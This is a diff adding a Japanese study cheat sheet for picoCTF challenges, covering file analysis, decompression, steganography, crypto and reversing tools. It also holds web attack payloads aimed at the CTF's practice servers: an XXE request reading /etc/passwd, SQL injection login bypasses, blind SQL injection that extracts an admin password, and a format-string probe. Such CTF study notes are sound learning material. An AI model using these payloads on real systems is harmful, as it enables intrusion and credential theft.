@@ -1,0 +1,320 @@
+
+判別に注意
+1,l,I,T
+v,V
+w,W
+9,q
+コマンドプロンプトの出力の日本語の部分が文字化けてしていても、コピーしてメモ帳等に張り付けると日本語になる
+
+
+解答		フラグ形式（picoCTF{}）がつかない場合がある
+
+共通		メモ帳で開いて、フラグの一部（picoCTF）で検索する
+                バイナリエディタ
+		fileコマンド、stringsコマンド
+		base64、ROT13
+		問題文、関連ファイルの見落とし（一番下まで確認する）
+		ファイルが知らずに出力されている場合があるので何も入れてないフォルダ内で調査を行う
+		本番では名前を変えない（指定された名前で処理を行う場合がある）
+
+
+不明な文字、数字	Google検索、base64変換、ROT13、From Hex、Cyberchef Magic
+
+不明なファイル		fileコマンド、
+			ヘッダからファイルを判別
+			ファイルのプロパティの詳細を見る
+
+数字に対応する文字	数字の順番通りに文字を並び替える　1:b 0:a 2:c  abc
+
+開けないファイル（bmp等）	ヘッダ部分を修正する、マジックナンバーまとめ-Qiita（https://qiita.com/forestsource/items/15933888466ba9c3f048）
+
+------------------------------------------------------------------------------------
+picoCTF{}	From Hex 	0x 70 69 63 6f 43 54 46 09	
+		From Base64 	cGljb0NURgk=8:58
+		ROT13		cvpbPGS	
+		From Binary	01110000 01101001 01100011 01101111 01000011 01010100 01000110 01111011 01111101
+
+------------------------------------------------------------------------------------
+exe		メモ帳
+		fileコマンド、catコマンド、stringsコマンド(strings XXX | grep ctf{)
+		readelf -e コマンド（ELF（Executable and Linkable Format）情報を表示する）
+		gdb test.exe、gdb>layout asm
+		ghidraで逆コンパイルしてfunctionsを見る
+                IDA - New - ファイル選択 - Open - OK
+
+------------------------------------------------------------------------------------
+fileコマンド	「shell archive text」のときは「./xxx」で実行
+		「current ar archive」のときは「ar -v -x xxx」を実行
+		「cpio archive」のときは「cpio -iv -D tmp < xxx」	tmpフォルダは事前に作成
+		「bzip2 compressed data, block size = 900k」のときは「bzip2 -d xxx」
+		「LZ4 compressed data (v1.4+)」のときは「lz4 -d xxx.lz4 flag.out 」
+		「LZMA compressed data, non-streamed, size 25」のときは「lzma -d -c flag.lz > output」
+		「lzop compressed data - version 1.040, LZO1X-1, os: Unix」のときは「lzop -d output -o flag.lzop」
+		「flag.lzop: lzip compressed data, version: 1」のときは「lzip -d flag.lzop -o flag  」
+		「XZ compressed data」のときは「unxz flag.xz」
+		「ASCII text」のときは「cat flag」又はCyberchefのMagic
+
+------------------------------------------------------------------------------------
+大量のファイルからフラグが書かれたファイルを見つける
+		find -type f -exec grep "picoCTF" {} \;
+
+------------------------------------------------------------------------------------
+画像（jpg, bmp, png）	EXIF確認君　http://exif-check.org/
+
+			exiftoolコマンド
+			画像のExif情報(撮影時のメタ情報)を見ることができるツール
+			exiftool test.jpg
+
+			binwalk -e --run-as=rootコマンド
+			ファイルの中に含まれているファイルを抽出できるコマンド
+			-e		ファイル抽出
+			--run-as=root	rootユーザとして実行
+			binwalk -e --run-as=root test.jpg
+
+
+			画像内にフラグ、モールス信号、文字列などがないか目視確認
+
+			ステガノコマンド steghide extract -sf picture.bmp
+
+			stegseek <解析対象のファイル> <辞書ファイル>
+
+------------------------------------------------------------------------------------
+pdf		黒塗りされていてもコピーすると、元の文字列がコピーされる問題もある
+
+pcap,PCAPNG	Wireshark - tcp.stream eq 1でフィルタリング（tcp.stream eq 1を入力） - 右クリック（対象はどれでも良い） - Follow - TCP Stream
+		Wireshark - File - Export Objects
+
+zip		fileコマンド
+		unzip -d out test.zip コマンド
+
+deb		7-zipで解凍する
+		Windowsの「.ios」などと同様のファイルの拡張子の一種で、Macで作成されMacのOSで利用されることを想定したイメージファイル
+		「.dmg」は、「Disk image file」の頭文字に由来
+
+Office		Officeで開く
+		マクロ確認
+		解凍
+
+Webサイト	F12ボタン
+		右クリック - ページのソースを表示（css、js、/robots.txt、/.htaccess、/.DS_Store）
+		ResponseBodyのみ出力( オプション指定なし )		curl    http://mercury.picoctf.net:53554/index.php
+		ResponseHeaderのみ出力( -I, --head )			curl -I http://mercury.picoctf.net:53554/index.php
+		ResponseHeaderとResponseBodyを出力( -i, --include )	curl -i http://mercury.picoctf.net:53554/index.php
+		RequestHeader とResponseBodyを出力( -v --verbose )	curl -v http://mercury.picoctf.net:53554/index.php
+		パケットデータ( --trace <file> --trace-ascii <file> )	curl --trace /dev/stdout http://localhost:8000
+		エラーメッセージを表示しない				curl -s http://mercury.picoctf.net:6418/check 
+		リクエストヘッダを追加					curl -H http://mercury.picoctf.net:6418/check 
+
+		curl -H  Request Headerを追加する。Content-Typeを指定する時など　 -H "Content-Type: application/json"
+		curl -d  POSTで送信するデータを記述
+		$ curl 'http://saturn.picoctf.net:61539/data' \
+		> -H 'Content-Type: application/xml' \
+		> -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT ID ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><data><ID>&xxe;</ID></data>'
+
+		/robots.txt	# Part 3: t_0f_pl4c
+				# I think this is an apache server... can you Access the next flag?
+		/.htaccess	# Part 4: 3s_2_lO0k
+				# I love making websites on my Mac, I can Store a lot of information there.
+		/.DS_Store	Congrats! You completed the scavenger hunt. Part 5: _a69684fd}
+
+		robots.txt	検索エンジンのクローラに対して、サイトのどの URL にアクセスしてよいかを伝えるもの
+		. htaccess	Apacheというウェブサーバーソフトウェアが使用されている環境の中で、ウェブサーバーをディレクトリ単位で制御するためのファイル
+		.DS_Store	Macで自動的に生成される、フォルダやファイルに関するmeta情報が記載されているファイル
+
+Webのクッキー	F12 - Applicationタブ - Storage - Cookies
+
+base64		CyberChef - To Base64、From Base64
+
+C言語ソースファイル	gcc in.c -o out コマンド
+
+Javaファイル　javac test.java　　java test　出力されたものをそのまま実行する、実行するとき拡張子のclassは付けない
+
+アセンブリファイル　aarch64-linux-gnu-as input.S -o outputコマンド - ghidraでデコンパイル
+		    gcc -masm=intel -m32 -c test.S -o test.o - ghidraでデコンパイル	拡張子は必ず大文字のS
+		　　アセンブリ実行サイト：https://www.mycompiler.io/ja/new/asm-x86_64
+		　　　mov	データ格納命令
+		　　　add	和
+		　　　sub	差
+		　　　imul	積
+		　　　idiv	商と剰余
+		　　　inc	インクリメント
+		　　　dec	デクリメント
+		　　　SAL	算術左シフト
+		　　　SAR	算術右シフト
+		　　　SHL	論理左シフト
+		　　　SHR	論理右シフト
+
+
+難読化されたjsファイル	Beauty Code（https://beautifier.io/）
+
+G-Code		G-Codeをプロットするサイト：https://ncviewer.com/	G17 G21 G40 G90 G64 P0.003 F50
+
+Twitterアカウント	Google検索、Twitter検索	
+
+ハッシュ値	Hash Toolkit（https://hashtoolkit.com/）
+
+SHA-1の復号	SHA-1 conversion and SHA-1 reverse lookup（https://sha1.gromweb.com/）
+
+RSA暗号の復号
+　Nの値がそれほど大きくないとき
+　　RSA Cipher Calculator　暗号文c,公開鍵(e,N),秘密鍵dを入力する
+　　https://www.dcode.fr/rsa-cipher
+　　Pythonプログラム
+　eの値が11のように小さいとき
+　　Pythonプログラム
+
+16進数のアスキー変換	バイナリエディタ
+
+法				41を法とするとき、Excelで「=MOD(X,41)」
+モジュラ逆数（modular invers）	41を法とするモジュラ逆数のとき、Pythonで「pow(X,-1,41)」
+
+
+モールス符号	https://morse.ariafloat.com/en/				文字
+		https://databorder.com/transfer/morse-sound-receiver/	音声
+
+
+換字暗号	Frequency Analysis Tool（https://wilsoa.github.io/gallery/frequency_analysis.html）
+　　　　　　　　頻出のe、theなどで推定
+
+レールフェンス暗号	https://www.dcode.fr/rail-fence-cipher
+
+ビジュネル暗号		https://linesegment.web.fc2.com/application/cipher/Vigenere.html
+
+イメージファイルのpartitionサイズ	mmls xxx.imgで取得可能
+
+通信の傍受　kali linux - [ドラゴンマーク]→[03-Web Application Analysis]→[Burp Suite] - Proxy - HTTP history
+
+SSH接続		ssh -p ポート番号 ユーザ名@サイトのURL（picoplayer@saturn.picoctf.net）
+
+SQLインジェクション	ユーザー名：user'--　パスワード：何でもよい
+			ユーザー名：user　パスワード：' OR 1=1--
+			'     ：ひとつ前の「'」と対となり、文字列定数（password=）を終わらせる
+			OR 1=1： uidの値に関係なく、検索条件を、真とさせる
+			--    ： それ以降の内容をコメントとして無視させる
+			SELECT uid FROM account_table WHERE uid='' OR 1=1--' AND pw='任意の文字列'
+			SELECT *   FROM user_table    WHERE user_name='porisuteru' AND password='' OR '1'='1'
+		
+			SQL文：データベースへ指示を出す言語
+			 80:http
+			443:https
+			*  ：全フィールドを表す
+			ASC：昇順
+			DESC：降順
+SELECT文：条件を指定してデータを検索し、その結果を表示
+SELECT 列名 FROM テーブル名
+SELECT 列名A,列名B,列名C FROM テーブル名A;
+　WHERE句：『FROM テーブル名』の後に付け加えることで、指定した列名のデータから、さらに条件に見合ったデータを抽出
+　WHERE 列名 条件式 値
+　AS句：カラムに別の名前を付ける
+　ORDER BY句：検索結果の並び替え
+　GROUP BY句：データをグループ化する
+INSERT文：指定した値でデータを挿入
+INSERT INTO テーブル名（列名A,列名B,…） VALUE（値A,値B,…）
+UPDATE文：既に登録されているデータの値を変更する
+UPDATE テーブル名 SET 更新内容
+DELETE文：指定した条件で、保存されているデータを消去
+DELETE FROM テーブル名
+
+SELECT [表示する要素名] FROM [テーブル名];
+INSERT INTO [データを追加したいテーブル名] (要素名A,要素名B) VALUES(要素Aに入れるデータ,要素Bに入れるデータ);
+UPDATE [テーブル名] SET [更新処理];
+DELETE FROM [テーブル名];
+
+SELECT 氏名 FROM 社員;　				社員というテーブルから氏名を抽出
+select * from palloc_home　				palloc_homeというテーブルから全フィールドを抽出（*は全フィールドを表す）
+SELECT *FROM 社員 WHERE 男性;　　			社員というテーブルから男性のデータのみを抽出
+SELECT 商品名,税抜き価格*1.10 AS 			税込み価格 FROM 商品;　　税抜き価格を税込み価格に変更
+SELECT * FROM 社員表 ORDER BY ASC;　			IDの昇順に整列　DESCは降順
+SELECT SUM(金額),日付 FROM 買い物の記録 GROUP BY 日付;　日付ごとに使った金額の合計を求める
+INSERT INTO テーブル名（列名A,列名B,…） VALUE（値A,値B,…）
+UPDATE 商品 SET　価格 = 110 WHERE 商品名='りんご’;　　	商品というテーブルにある、りんごの価格を全て110にする
+DELETE FROM テーブル名A WHERE 列名A = NULL;　		列名Aの値が空白のデータのみ削除
+
+' OR 1=1--								SQLインジェクションの攻撃が有効かの確認
+' or (SELECT length(pass) FROM user WHERE id = 'admin') > 6 --		パスワードの文字数調査　出力：Congratulations!
+' or (SELECT length(pass) FROM user WHERE id = 'admin') > 20 --		パスワードの文字数調査　出力：Congratulations!
+' or (SELECT length(pass) FROM user WHERE id = 'admin') > 21 --		パスワードの文字数調査　出力：Login Failed 　　　パスワードは21文字
+
+' or substr((SELECT pass FROM user WHERE id = 'admin'), 1, 1) = 'F' --	1文字目のパスワード調査　出力：Congratulations!
+' or substr((SELECT pass FROM user WHERE id = 'admin'), 2, 1) = 'L' --	2文字目のパスワード調査　出力：Congratulations!
+' or substr((SELECT pass FROM user WHERE id = 'admin'), 3, 1) = 'A' --	3文字目のパスワード調査　出力：Congratulations!
+' or substr((SELECT pass FROM user WHERE id = 'admin'), 4, 1) = 'G' --	4文字目のパスワード調査　出力：Congratulations!
+' or substr((SELECT pass FROM user WHERE id = 'admin'), 5, 1) = '_' --	5文字目のパスワード調査　出力：Congratulations!
+
+
+オーバーフロー	32ビットの int の値の範囲が-2,147,483,648 ～ 2,147,483,647を超す
+
+書式文字列攻撃	printf("%s", str)ではなくprintf(str)を使用
+		$ echo -e "aaaa %x %x %x %x %x %x %x %x %x %x" | ./a.out	echo -e でエンコードして出力
+		aaaa 12068 100 103 40 7c190040 0 0 54a6cab0 0 61616161
+
+
+uuencode	begin 666 <data>
+		複合サイトWeb Utils（https://www.webutils.pl/UUencode）
+
+APKファイル	dex2jarをダウンロード（https://github.com/pxb1988/dex2jar）
+		dex2jar-2.0.zipを解凍して、dex2jar-2.0\dex2jar-2.0\d2j-dex2jarフォルダに移動
+		d2j-dex2jarでAPKファイルをJARファイル形式に変換
+		$ d2j-dex2jar -o 124_timer-dex2jar.jar -f 124_timer.apk
+		Win-Kexで以下を実行してJD-GUIを起動
+		wget https://github.com/java-decompiler/jd-gui/releases/download/v1.6.6/jd-gui-1.6.6.jar
+		java -jar jd-gui-1.6.6.jar  
+		JD-GUIに124_timer-dex2jar.jarをドラッグアンドドロップ
+		com - example.timer - Buldconfig.classにフラグがハードコードされている
+
+DAE ファイル	3D DAE ファイルをオンラインで表示する
+		https://imagetostl.com/view-dae-online
+
+IPアドレス	whoisコマンド	whois [IPアドレス]
+
+begin 666	uuencodeで符号化されていることを表す
+		uuencodeの複合サイトWeb Utils（https://www.webutils.pl/UUencode）
+
+複数のエンコード/デコード結果をまとめて出力するサイト
+https://encodemaniax.com/
+デコード
+　Base64 Decode
+　URL Decode
+　HTML Decode
+　数値参照(10進数)
+　Hex2Bin 16進数表記された8ビットバイナリデータを文字列に変換
+　JSON 整形 escaped UTF-8 専用
+　JSON 整形 unescaped UTF-8 専用
+　MIME Decode
+　uudecode
+　PHP Unserialize
+　Quoted Printable
+　Query String
+エンコード
+　HTML実体参照
+　数値参照(10進数) UTF-8限定
+　数値参照(16進数)
+　Base64 Encode
+　URL Encode
+　MIME Encode
+　uuencode
+　PHP Serialize
+　PHP Short Array Syntax
+　Quoted Printable
+　JavaScript String
+　JavaScript encodeURIComponent() UTF-8限定
+　JavaScript encodeURI() UTF-8限定
+　JavaScript escape() UTF-8限定
+　datetime to unixtime
+　unixtime to datetime
+　半角
+　全角
+　大文字
+　小文字
+　ブログURL 半角小文字化とハイフン区切り
+　MD5
+　MD4
+　CRC32
+　SHA1
+　SHA-256
+　SHA-384
+　SHA-512
+　QRコード 150x150 (Google Charts API)
+　QRコード 300x300 (Google Charts API)
+　バイト数
+　文字数
